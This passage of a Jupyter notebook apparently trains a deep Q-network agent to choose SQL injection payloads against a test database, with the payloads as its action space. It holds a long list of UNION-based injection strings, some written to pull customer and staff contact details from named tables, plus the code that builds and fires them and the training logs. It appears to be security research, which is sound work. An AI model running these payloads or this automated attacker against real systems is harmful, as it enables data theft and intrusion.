       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' UNION SELECT category_id, category_name, NULL, NULL, NULL, NULL FROM production.categories--\",\n",
       " \"' UNION SELECT brand_id, brand_name, NULL, NULL, NULL, NULL FROM production.brands--\",\n",
       " \"' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\n",
       " \"' UNION SELECT customer_id, first_name, last_name, phone, email, street FROM sales.customers--\",\n",
       " \"' UNION SELECT store_id, store_name, phone, email, street, city FROM sales.stores--\",\n",
       " \"' UNION SELECT staff_id, first_name, last_name, email, phone, active FROM sales.staffs--\",\n",
       " \"' UNION SELECT order_id, customer_id, order_status, order_date, required_date, shipped_date FROM sales.orders--\",\n",
       " \"' UNION SELECT order_id, item_id, product_id, quantity, list_price, discount FROM sales.order_items--\",\n",
       " \"' UNION SELECT store_id, product_id, quantity, NULL, NULL, NULL FROM production.stocks--\",\n",
       " \"' UNION SELECT category_id, category_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM production.categories--\",\n",
       " \"' UNION SELECT brand_id, brand_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM production.brands--\",\n",
       " \"' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price, NULL, NULL, NULL FROM production.products--\",\n",
       " \"' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\",\n",
       " \"' UNION SELECT store_id, store_name, phone, email, street, city, state, zip_code, NULL FROM sales.stores--\",\n",
       " \"' UNION SELECT staff_id, first_name, last_name, email, phone, active, store_id, manager_id, NULL FROM sales.staffs--\",\n",
       " \"' UNION SELECT order_id, customer_id, order_status, order_date, required_date, shipped_date, store_id, staff_id, NULL FROM sales.orders--\",\n",
       " \"' UNION SELECT order_id, item_id, product_id, quantity, list_price, discount, NULL, NULL, NULL FROM sales.order_items--\",\n",
       " \"' UNION SELECT store_id, product_id, quantity, NULL, NULL, NULL, NULL, NULL, NULL FROM production.stocks--\"]"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Payloads extracted from generic error and union sections from: https://github.com/payloadbox/sql-injection-payload-list\n",
    "# TODO: Remove non-MSSQL payloads.\n",
    "payloads = open('sqli_payloads.txt', 'r').read().split('\\n')\n",
    "\n",
    "for context_col_count in context_col_counts:\n",
    "    for i in range(0, len(tables)):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        table = tables[i]\n",
    "        table_columns = columns[i]\n",
    "        table_col_count = len(table_columns)\n",
    "\n",
    "        for i in range(0, context_col_count):\n",
    "            if i < table_col_count:\n",
    "                payload += table_columns[i]\n",
    "            else:\n",
    "                payload += 'NULL'\n",
    "            if i < context_col_count - 1:\n",
    "                payload += ', '\n",
    "        \n",
    "        payload += f' FROM {table}--'\n",
    "        payloads.append(payload)\n",
    "\n",
    "payloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Link SQL Injection Attacks to Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "reward_success = 1\n",
    "reward_end = 10\n",
    "reward_norm = 0\n",
    "# Reward for invalid action.\n",
    "reward_mask = 0\n",
    "\n",
    "# Perfoms an SQL injection attack based on an index from the list of payloads.\n",
    "def perform_action(payload_index):\n",
    "    payload = payloads[payload_index]\n",
    "    reward = reward_norm\n",
    "    episode_over = False\n",
    "\n",
    "    try:\n",
    "        df = inject_payload(payload, context)\n",
    "        # Check episode termination condition, and if true, apply appropriate reward.\n",
    "        # An episode will terminate once the goal of the final context is reached.\n",
    "        # TODO: Ensure tables are filtered as the same column name could exist in another table.\n",
    "\n",
    "        #for column in context['column_filter']:\n",
    "        #    if column in df and context['goal'] in df[column].values:\n",
    "\n",
    "        if context['goal'] in df.values:\n",
    "            if context_index < len(contexts) - 1:\n",
    "                reward = reward_success\n",
    "                increment_context()\n",
    "            else:\n",
    "                reward = reward_end\n",
    "                episode_over = True\n",
    "\n",
    "        res = df.to_csv()\n",
    "        has_error = False\n",
    "    except:\n",
    "        # Record error as a String.\n",
    "        res = str(sys.exc_info()[1])\n",
    "        has_error = True\n",
    "    \n",
    "    res = bytearray(res, 'ascii')\n",
    "    res = hashlib.md5(res).digest()\n",
    "    res = list(res)\n",
    "\n",
    "    # Add error information if this is set.\n",
    "    if mark_error:\n",
    "        res.append(int(has_error))\n",
    "\n",
    "    res = np.array(res, dtype='float32')\n",
    "\n",
    "    return res, reward, episode_over"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "DQN (Adapted from https://keras.io/examples/rl/deep_q_network_breakout/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "gamma = 0.99  # Discount factor for past rewards\n",
    "starting_epsilon = 1.0\n",
    "epsilon = starting_epsilon  # Epsilon greedy parameter\n",
    "epsilon_min = 0.1 # Minimum epsilon greedy parameter\n",
    "epsilon_max = 1.0  # Maximum epsilon greedy parameter\n",
    "epsilon_interval = (\n",
    "    epsilon_max - epsilon_min\n",
    ")  # Rate at which to reduce chance of random action being taken\n",
    "learning_rate = 0.0025\n",
    "batch_size = 32  # Size of batch taken from replay buffer\n",
    "max_steps_per_episode = 10000\n",
    "training_episodes = 500\n",
    "test_episodes = 100\n",
    "episodes = training_episodes + test_episodes\n",
    "\n",
    "num_actions = len(payloads)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"model_3\"\n",
      "_________________________________________________________________\n",
      " Layer (type)                Output Shape              Param #   \n",
      "=================================================================\n",
      " input_4 (InputLayer)        [(32, 17, 1)]             0         \n",
      "                                                                 \n",
      " conv1d_9 (Conv1D)           (32, 5, 32)               64        \n",
      "                                                                 \n",
      " conv1d_10 (Conv1D)          (32, 3, 64)               2112      \n",
      "                                                                 \n",
      " conv1d_11 (Conv1D)          (32, 3, 64)               4160      \n",
      "                                                                 \n",
      " flatten_3 (Flatten)         (32, 192)                 0         \n",
      "                                                                 \n",
      " dense_6 (Dense)             (32, 512)                 98816     \n",
      "                                                                 \n",
      " dense_7 (Dense)             (32, 500)                 256500    \n",
      "                                                                 \n",
      "=================================================================\n",
      "Total params: 361,652\n",
      "Trainable params: 361,652\n",
      "Non-trainable params: 0\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "def create_q_model(batch_size):\n",
    "    # Network defined by the Deepmind paper\n",
    "    inputs = layers.Input(shape=(features, 1), batch_size=batch_size)\n",
    "\n",
    "    # Convolutions on the frames on the screen\n",
    "    layer1 = layers.Conv1D(32, 1, strides=4, activation=\"relu\")(inputs)\n",
    "    layer2 = layers.Conv1D(64, 1, strides=2, activation=\"relu\")(layer1)\n",
    "    layer3 = layers.Conv1D(64, 1, strides=1, activation=\"relu\")(layer2)\n",
    "\n",
    "    layer4 = layers.Flatten()(layer3)\n",
    "\n",
    "    layer5 = layers.Dense(512, activation=\"relu\")(layer4)\n",
    "    action = layers.Dense(num_actions, activation=\"linear\")(layer5)\n",
    "\n",
    "    return keras.Model(inputs=inputs, outputs=action)\n",
    "\n",
    "# The first model makes the predictions for Q-values which are used to\n",
    "# make an action.\n",
    "model = create_q_model(1)\n",
    "model.compile(optimizer='adam')\n",
    "# Build a target model for the prediction of future rewards.\n",
    "# The weights of a target model get updated every 10000 steps thus when the\n",
    "# loss between the Q-values is calculated the target Q-value is stable.\n",
    "model_target = create_q_model(batch_size)\n",
    "model_target.compile(optimizer='adam')\n",
    "model_target.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "class EpisodeAnalytics:\n",
    "    def __init__(self):\n",
    "        self.actions = []\n",
    "        self.attempts = []\n",
    "        self.timings = []\n",
    "    \n",
    "    def record_success(self, action, num_actions_attempted, time_taken):\n",
    "        self.actions.append(action)\n",
    "        self.attempts.append(num_actions_attempted)\n",
    "        self.timings.append(time_taken)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DQNAnalytics:\n",
    "    def __init__(self):\n",
    "        self.analytics_start_time = time.time_ns()\n",
    "        self.episode_data = []\n",
    "\n",
    "    def begin_episode(self):\n",
    "        self.episode_data.append(EpisodeAnalytics())\n",
    "        self.start_time = time.time_ns()\n",
    "        self.attempts = 0\n",
    "\n",
    "    def add_attempt(self):\n",
    "        self.attempts += 1\n",
    "\n",
    "    def record_success(self, action):\n",
    "        time_taken = time.time_ns() - self.start_time\n",
    "        self.episode_data[len(self.episode_data)-1] \\\n",
    "            .record_success(action, self.attempts, time_taken)\n",
    "        self.attempts = 0\n",
    "\n",
    "    def _get_episodes_array(self):\n",
    "        return [i for i in range(1, episodes+1)]\n",
    "\n",
    "    def _plot_remainder_and_show(self):\n",
    "        plt.title(f'γ = {gamma}, ε ∈ [{epsilon_min}, {epsilon_max}] Starting at ε = {starting_epsilon}, α = {learning_rate}')\n",
    "        plt.xlabel('Episode')\n",
    "        plt.axvline(x=training_episodes, color='m', label = 'Training End', linestyle='--')\n",
    "        plt.legend()\n",
    "        plt.show()\n",
    "    \n",
    "    def plot_avg_attempts(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        avg_attempts = [np.average(ed.attempts) if len(ed.attempts) != 0 else None for ed in self.episode_data]\n",
    "        plt.scatter(episodes, avg_attempts, marker='^')\n",
    "        plt.suptitle('Average Attempts for Goals Found per Episode')\n",
    "        plt.ylabel('Average Attempts')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_context_attempts(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        for i in range(0, len(contexts)):\n",
    "            context_attempts = [ed.attempts[i] if i < len(ed.attempts) else None for ed in self.episode_data]\n",
    "            plt.scatter(episodes, context_attempts, label=f'Context {i+1}', marker='^')\n",
    "        plt.suptitle('Attempts per Goal Found per Episode')\n",
    "        plt.ylabel('Attempts')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_avg_timings(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        avg_timings = [np.average(ed.timings)/1000000000 if len(ed.timings) != 0 else None for ed in self.episode_data]\n",
    "        plt.scatter(episodes, avg_timings, marker='^')\n",
    "        plt.suptitle('Average Time Taken in Seconds for Goals Found per Episode')\n",
    "        plt.ylabel('Average Time Taken (s)')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_context_timings(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        for i in range(0, len(contexts)):\n",
    "            context_timings = [ed.timings[i]/1000000000 if i < len(ed.timings) else None for ed in self.episode_data]\n",
    "            plt.scatter(episodes, context_timings, label=f'Context {i+1}', marker='^')\n",
    "        plt.suptitle('Time Taken in Seconds per Goals Found per Episode')\n",
    "        plt.ylabel('Time Taken (s)')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def get_test_payloads(self):\n",
    "        indices = []\n",
    "        episode_actions = []\n",
    "        for i in range(training_episodes, episodes):\n",
    "            indices.append(f'Episode {i+1}')\n",
    "            curr_episode_data = self.episode_data[i]\n",
    "            curr_episode_actions = [payloads[curr_episode_data.actions[j]] if j < len(curr_episode_data.actions) else 'N/A' for j in range(len(contexts))]\n",
    "            episode_actions.append(curr_episode_actions)\n",
    "        \n",
    "        column_names = [f'Context {i+1}' for i in range(len(contexts))]\n",
    "        columns = [[] for i in range(len(contexts))]\n",
    "        for actions in episode_actions:\n",
    "            for i in range(len(actions)):\n",
    "                columns[i].append(actions[i])\n",
    "\n",
    "        table = {}\n",
    "        for i in range(len(contexts)):\n",
    "            table[column_names[i]] = columns[i]\n",
    "\n",
    "        df = pd.DataFrame(table, index=indices)\n",
    "        return df\n",
    "\n",
    "    def stop_analytics(self):\n",
    "        self.analytics_run_time = time.time_ns() - self.analytics_start_time\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create All Possible Payloads (Action Space)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_empty_state():\n",
    "    return np.array([0] * features, dtype='float32')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 300\t Context: 2\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 400\t Context: 2\n",
      "Running reward: 11.00\t Episode 2\t Frame count: 500\t Context: 1\n",
      "Running reward: 11.00\t Episode 2\t Frame count: 600\t Context: 1\n",
      "Running reward: 11.00\t Episode 2\t Frame count: 700\t Context: 1\n",
      "Running reward: 11.00\t Episode 2\t Frame count: 800\t Context: 2\n",
      "Running reward: 11.00\t Episode 3\t Frame count: 900\t Context: 2\n",
      "Running reward: 11.00\t Episode 4\t Frame count: 1000\t Context: 1\n",
      "Running reward: 11.00\t Episode 4\t Frame count: 1100\t Context: 1\n",
      "Running reward: 11.00\t Episode 4\t Frame count: 1200\t Context: 1\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1300\t Context: 1\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1400\t Context: 2\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 6\t Frame count: 1600\t Context: 1\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1700\t Context: 1\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 6\t Frame count: 1900\t Context: 1\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 2000\t Context: 1\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 2100\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 2200\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2300\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2400\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2500\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2600\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2700\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2800\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2900\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3000\t Context: 1\n",
      "Running reward: 11.00\t Episode 8\t Frame count: 3100\t Context: 2\n",
      "Running reward: 11.00\t Episode 8\t Frame count: 3200\t Context: 2\n",
      "Running reward: 11.00\t Episode 8\t Frame count: 3300\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 3400\t Context: 1\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 3500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 9\t Frame count: 3600\t Context: 1\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 3700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 9\t Frame count: 3800\t Context: 1\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 3900\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 4000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 10\t Frame count: 4100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 10\t Frame count: 4200\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 4300\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 4400\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 4500\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 4600\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 4700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 11\t Frame count: 4800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 11\t Frame count: 4900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 11\t Frame count: 5000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 12\t Frame count: 5100\t Context: 1\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 5200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 13\t Frame count: 5300\t Context: 1\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 5400\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 5500\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 5600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 13\t Frame count: 5700\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 5800\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 5900\t Context: 2\n",
      "Running reward: 11.00\t Episode 14\t Frame count: 6000\t Context: 1\n",
      "Running reward: 11.00\t Episode 14\t Frame count: 6100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
